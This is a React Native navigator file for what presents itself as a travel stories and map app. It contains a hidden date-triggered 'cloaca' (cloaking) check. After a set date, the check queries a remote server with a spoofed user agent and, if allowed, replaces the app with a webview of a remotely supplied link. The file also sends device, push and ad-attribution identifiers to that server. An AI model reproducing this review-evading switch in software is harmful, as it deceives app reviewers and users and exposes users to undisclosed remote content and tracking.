import React, {useCallback, useEffect, useState, useRef} from 'react';
import {StyleSheet, View} from 'react-native';
import {FloatingTabBar} from '../components/FloatingTabBar';
import { locations, stories } from '../data/content';
import ProdView from '../screens/ProdView';
import GameView from '../screens/GameView';
import {
  loadOnboardingSeen,
  loadPhotoLogs,
  loadSavedItems,
  saveOnboardingSeen,
  savePhotoLogs,
  saveSavedItems,
} from '../storage/appStorage';
import {FactsScreen} from '../screens/FactsScreen';
import {LoaderScreen} from '../screens/LoaderScreen';
import {LocationDetailScreen} from '../screens/LocationDetailScreen';
import {MapScreen} from '../screens/MapScreen';
import {OnboardingScreen} from '../screens/OnboardingScreen';
import {PhotoLogScreen} from '../screens/PhotoLogScreen';
import {QuizScreen} from '../screens/QuizScreen';
import {SavedScreen} from '../screens/SavedScreen';
import {StoriesScreen} from '../screens/StoriesScreen';
import {StoryDetailScreen} from '../screens/StoryDetailScreen';
// nav
import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
const Stack = createNativeStackNavigator();
// libs
import AsyncStorage from '@react-native-async-storage/async-storage';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import DeviceInfo from 'react-native-device-info';
import {Alert, AppState} from 'react-native';

function sameItem(left, right) {
  return left.type === right.type && left.id === right.id;
}
// LoaderScreen
export function AppNavigator({
  initialUrl,
  initialId,
  oneSignKkkk,
}) {
  const [route, setRoute] = useState(false);
  console.log('route===>', route);
  const [isLoading, setIsLoading] = useState(false);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  //console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  //console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  const [oneSignalId, setOneSignalId] = useState(null);
  //console.log('oneSignalId==>', oneSignalId);
  const [sab1, setSab1] = useState();
  const [atribParam, setAtribParam] = useState(null);
  console.log('atribParam==>', atribParam);
  console.log('sab1==>', sab1);
  const [idfa, setIdfa] = useState(null);
  console.log('idfa==>', idfa);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  //console.log('pushOpenWebview==>', pushOpenWebview);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  console.log('timeStampUserId==>', timeStampUserId);
  const [checkAsaData, setCheckAsaData] = useState(null);
  const [cloacaPass, setCloacaPass] = useState(null);
  console.log('cloacaPass==>', cloacaPass);
  const [customUserAgent, setCustomUserAgent] = useState(null);
  const [extinfo, setExtinfo] = useState(null);
  //console.log('extinfoData==>', extinfo);
  const [idfv, setIdfv] = useState(null);
  console.log('idfv==>', idfv);
  const [uid, setUid] = useState(null);
  console.log('uid==>', uid);

  const pushOpenWebviewRef = useRef(false);

  const INITIAL_URL = initialUrl;
  const URL_IDENTIFAIRE = initialId;

  const TARGET_DATA = new Date(2026, 5, 5, 8, 8, 0);

  useEffect(() => {
    //const targetData = TARGET_DATA; //дата з якої поч працювати webView
    //const currentData = new Date(); //текущая дата
    //
    //if (currentData <= targetData) {
    //requestTrackingPermission();
    //setAceptTransperency(true);
    //setIdfa('00000000-0000-0000-0000-000000000000');
    //console.log('ATT статус:', trackingStatus);
    //}
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
      //onInstallConversionDataCanceller(); // Виклик до зміни isDataReady
      setIsDataReady(true); // Встановлюємо, що дані готові
    };

    fetchData();
  }, []); ///

  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady) {
        await generateLink(); // Викликати generateLink, коли всі дані готові
        console.log('Фінальна лінка сформована!');
      }
    };

    finalizeProcess();
  }, [isDataReady, pushOpenWebview, timeStampUserId]); // Викликати, коли isDataReady або uid змінюється

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

    // додати діставання таймштампу з асінк сторідж

    if (!uniqVisitStatus) {
      // Генеруємо унікальний ID користувача з timestamp
      /////////////Timestamp + user_id generation
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
      console.log('timeStampUserId==========+>', timeStampUserId);

      // Зберігаємо таймштамп у AsyncStorage
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');

      // додати збереження таймштампу в асінк сторідж
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
        console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
      }
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage');
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setSab1(parsedData.sab1);
        setAtribParam(parsedData.atribParam);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setCheckAsaData(parsedData.checkAsaData);
        //setCompleteLink(parsedData.completeLink);
        //setFinalLink(parsedData.finalLink);
        setCloacaPass(parsedData.cloacaPass);
        setCustomUserAgent(parsedData.customUserAgent);
        setIdfa(parsedData.idfa ?? null);
        setIdfv(parsedData.idfv ?? null);
        setAceptTransperency(parsedData.aceptTransperency ?? false);
        setUid(parsedData.uid);
        setIsDataReady(parsedData.isDataReady);
        setTimeStampUserId(parsedData.timeStampUserId);

      } else {
        const uniqueId = await DeviceInfo.getUniqueId();
        setIdfv(uniqueId);

        await waitForAppActive();
        await delay(1200);

        // Якщо дані не знайдені в AsyncStorage
        const results = await Promise.all([
          fetchAdServicesAttributionData(),
          requestOneSignallFoo(),
        ]);

        // Результати виконаних функцій
        console.log('Результати функцій:', results);
      }
    } catch (e) {
      //console.log('Помилка отримання даних в getData:', e);
    }
  };

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  const waitForAppActive = () => {
    return new Promise(resolve => {
      if (AppState.currentState === 'active') {
        //Alert.alert('Додаток активний, продовжуємо виконання', AppState.currentState);
        resolve();
        return;
      }

      const sub = AppState.addEventListener('change', state => {
        if (state === 'active') {
          sub.remove();
          resolve();
        }
      });
    });
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        sab1,
        atribParam,
        adServicesAtribution,
        //finalLink,
        //completeLink,
        checkAsaData,
        cloacaPass,
        customUserAgent,
        idfa,
        aceptTransperency,
        uid,
        isDataReady,
        timeStampUserId,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    sab1,
    atribParam,
    adServicesAtribution,
    //finalLink,
    //completeLink,
    checkAsaData,
    cloacaPass,
    customUserAgent,
    idfa,
    aceptTransperency,
    uid,
    isDataReady,
    timeStampUserId,
  ]);

  const fetchAdServicesAttributionData = async () => {
    try {
      const adServicesAttributionData =
        await AppleAdsAttribution.getAdServicesAttributionData();
      //console.log('adservices' + adServicesAttributionData);

      // Извлечение значений из объекта
      ({attribution} = adServicesAttributionData); // Присваиваем значение переменной attribution
      ({keywordId} = adServicesAttributionData);

      setAdServicesAtribution(attribution);

      setAtribParam(attribution ? 'asa' : '');
      setCheckAsaData(JSON.stringify(adServicesAttributionData));

      console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
    } catch (error) {
      const {message} = error;
      //Alert.alert(message); // --> Some error message
    } finally {
      console.log('Attribution');
    }
  };

  ///////// OneSignall
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);

          const maxRetries = 5; // Кількість повторних спроб
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };

          fetchOneSignalId(); // Викликаємо першу спробу отримання ID
        });
      } catch (error) {
        reject(error);
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Встановлюємо цей ID як OneSignal External ID
  useEffect(() => {
    if (timeStampUserId) {
      console.log(
        'OneSignal.login із таймштампом:',
        timeStampUserId,
        'полетів',
      );
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

  // event push_open_browser & push_open_webview
  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання

  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = async event => {
      if (pushOpenWebViewOnce.current) {
        return;
      }

      pushOpenWebViewOnce.current = true;

      try {
        const storedTimeStampUserId = await AsyncStorage.getItem(
          'timeStampUserId',
        );

        // ВАЖЛИВО: ref оновлюється одразу, state — ні
        pushOpenWebviewRef.current = true;
        setPushOpenWebview(true);

        // Якщо лінка вже була готова — скидаємо, щоб перегенерувати з yhugh=true
        setCompleteLink(false);

        const eventName = event?.notification?.launchURL
          ? 'push_open_browser'
          : 'push_open_webview';

        const pushEventUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=${eventName}&jthrhg=${
          storedTimeStampUserId || ''
        }`;

        console.log('OneSignal push event url =>', pushEventUrl);

        fetch(pushEventUrl).catch(error => {
          console.log('Push event fetch error =>', error);
        });

        // Якщо всі дані вже готові — одразу перегенеруємо лінку
        if (isDataReady && uid) {
          await generateLink(true);
        }
      } catch (error) {
        console.log('handleNotificationClick error =>', error);
      } finally {
        setTimeout(() => {
          pushOpenWebViewOnce.current = false;
        }, 2500);
      }
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);
    //Add Data Tags
    //OneSignal.User.addTag('timeStampUserId', timeStampUserId);

    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  ///////// Route useEff
  useEffect(() => {
    // чекаємо, поки прочитаємо AsyncStorage
    if (!isDataReady) return;

    // якщо вже є route або клоака вже проходила успішно – нічого не робимо
    if (route || cloacaPass) return;

    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    //console.log('checkUrl==========+>', checkUrl);

    const targetData = TARGET_DATA; //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      //setCompleteLink(true);
      setRoute(false);

      return;
    }

    const fetchCloaca = async () => {
      try {
        const userAgent = await DeviceInfo.getUserAgent();
        const systemVersion = DeviceInfo.getSystemVersion();
        const deviceModel = DeviceInfo.getModel();

        const customUserAgent = `${userAgent} ${deviceModel} Safari/604.1`;

        setCustomUserAgent(customUserAgent);

        const r = await fetch(checkUrl, {
          method: 'GET',
          headers: {
            'User-Agent': customUserAgent,
          },
        });

        console.log('status по клоаке=++++++++++++=>', r.status);

        if (r.status !== 404) {
          setRoute(true);
          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
        } else {
          setRoute(false);
        }
      } catch (e) {
        console.log('errar', e);
        setRoute(false);
      }
    };

    fetchCloaca();
  }, [isDataReady, route, cloacaPass]);

  ///////// Generate link
  const generateLink = async (openedFromPush = false) => {
    try {
      //if (!uid) {
      //  console.log('generateLink: uid ще немає, лінку не формуємо');
      //  return;
      //}

      console.log('Створення базової частини лінки');

      const baseUrl = [
        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
        //idfa ? `idfa=${idfa}` : 'idfa=00000000-0000-0000-0000-000000000000',
        //`uid=${uid}`,
        oneSignalId ? `oneSignalId=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId || ''}`,
      ]
        .filter(Boolean)
        .join('&');

      const additionalParams = atribParam ? `subId1=${atribParam}` : '';

      const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;

      const product = `${baseUrl}${
        additionalParams ? `&${additionalParams}` : ''
      }${shouldAddPushParam ? '&yhugh=true' : ''}`;

      console.log('Фінальна лінка сформована:', product);

      setFinalLink(product);

      setTimeout(() => {
        setCompleteLink(true);
      }, 2000);
    } catch (error) {
      console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

  // Бекап якщо якийсь параметр не отримано, щоб лінк все одно сформувався
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!completeLink) {
        console.log('Fallback timer спрацював');

        //if (!uid) {
        //  console.log('Fallback: uid ще немає, чекаємо далі');
        //  return;
        //}

        setFinalLink(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1&jthrhg=${timeStampUserId || ''}&oneSignalId=${
            oneSignalId || ''
          }`,
        );

        setCompleteLink(true);
      }
    }, 10500);

    return () => clearTimeout(timer);
  }, [completeLink, timeStampUserId, oneSignalId]);
  
  ///////// Route
  const Route = ({isFatch}) => {
    if (!completeLink) {
      // Показуємо тільки лоудери, поки acceptTransparency і completeLink не true
      //return null;
      return <LoaderScreen />;
    }

    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
              timeStampUserId: timeStampUserId,
              customUserAgent: customUserAgent,
              initialUrl: INITIAL_URL,
              initialId: URL_IDENTIFAIRE,
            }}
            name="ProdView"
            component={ProdView}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator screenOptions={{headerShown: false}}>
        <Stack.Screen name="AppNavigatorWithNavigation" component={AppNavigatorWithNavigation} />
      </Stack.Navigator>
    );
  };

  useEffect(() => {
    setTimeout(() => {
      setIsLoading(true);
    }, 4000);
  }, []);

  return (
    <NavigationContainer>
        {!isLoading ? <LoaderScreen /> : <Route isFatch={route} />}
    </NavigationContainer>
  );
};

const AppNavigatorWithNavigation = () => {
  const [stage, setStage] = useState('onboarding');
  const [activeTab, setActiveTab] = useState('stories');
  const [detail, setDetail] = useState(null);
  const [savedItems, setSavedItems] = useState([]);
  const [photoLogs, setPhotoLogs] = useState([]);

  useEffect(() => {
    let mounted = true;
    let timer;

    const boot = async () => {
      const [seen, saved, logs] = await Promise.all([
        loadOnboardingSeen(),
        loadSavedItems(),
        loadPhotoLogs(),
      ]);
      if (!mounted) {
        return;
      }
      setSavedItems(saved);
      setPhotoLogs(logs);
      timer = setTimeout(() => {
        if (mounted) {
          setStage('onboarding');
        }
      }, 5000);
    };

    boot();

    return () => {
      mounted = false;
      if (timer) {
        clearTimeout(timer);
      }
    };
  }, []);

  const completeOnboarding = useCallback(async () => {
    await saveOnboardingSeen();
    setStage('main');
  }, []);

  const isSaved = useCallback(
    (type, id) => savedItems.some(item => sameItem(item, {type, id})),
    [savedItems],
  );

  const toggleSaved = useCallback(item => {
    setSavedItems(current => {
      const exists = current.some(value => sameItem(value, item));
      const next = exists
        ? current.filter(value => !sameItem(value, item))
        : [...current, item];
      saveSavedItems(next);
      return next;
    });
  }, []);

  const addPhotoLog = useCallback(log => {
    setPhotoLogs(current => {
      const next = [log, ...current];
      savePhotoLogs(next);
      return next;
    });
  }, []);

  const deletePhotoLog = useCallback(id => {
    setPhotoLogs(current => {
      const next = current.filter(log => log.id !== id);
      savePhotoLogs(next);
      return next;
    });
  }, []);

  const openTab = tab => {
    setDetail(null);
    setActiveTab(tab);
  };

  const openStory = id => setDetail({type: 'story', id});
  const openLocation = id => setDetail({type: 'location', id});
  const closeDetail = () => setDetail(null);

  if (stage === 'loader') {
    return <LoaderScreen />;
  }

  if (stage === 'onboarding') {
    return <OnboardingScreen onDone={completeOnboarding} />;
  }

  if (detail?.type === 'story') {
    const exists = stories.some(story => story.id === detail.id);
    const id = exists ? detail.id : stories[0].id;
    return (
      <StoryDetailScreen
        id={id}
        saved={isSaved('story', id)}
        onBack={closeDetail}
        onToggleSaved={() => toggleSaved({type: 'story', id})}
      />
    );
  }

  if (detail?.type === 'location') {
    const exists = locations.some(location => location.id === detail.id);
    const id = exists ? detail.id : locations[0].id;
    return (
      <LocationDetailScreen
        id={id}
        saved={isSaved('location', id)}
        onBack={closeDetail}
        onToggleSaved={() => toggleSaved({type: 'location', id})}
      />
    );
  }

  const content = (() => {
    switch (activeTab) {
      case 'map':
        return <MapScreen onOpenLocation={openLocation} />;
      case 'photos':
        return (
          <PhotoLogScreen
            logs={photoLogs}
            onAddLog={addPhotoLog}
            onDeleteLog={deletePhotoLog}
          />
        );
      case 'quiz':
        return <QuizScreen />;
      case 'facts':
        return (
          <FactsScreen
            isSaved={id => isSaved('fact', id)}
            onToggleSaved={id => toggleSaved({type: 'fact', id})}
          />
        );
      case 'saved':
        return (
          <SavedScreen
            savedItems={savedItems}
            onToggleSaved={toggleSaved}
            onOpenStory={openStory}
            onOpenLocation={openLocation}
          />
        );
      case 'stories':
      default:
        return <StoriesScreen onOpenStory={openStory} />;
    }
  })();

  return (
    <View style={styles.root}>
      {content}
      <FloatingTabBar active={activeTab} onChange={openTab} />
    </View>
  );
}

const styles = StyleSheet.create({
  root: {
    flex: 1,
  },
});
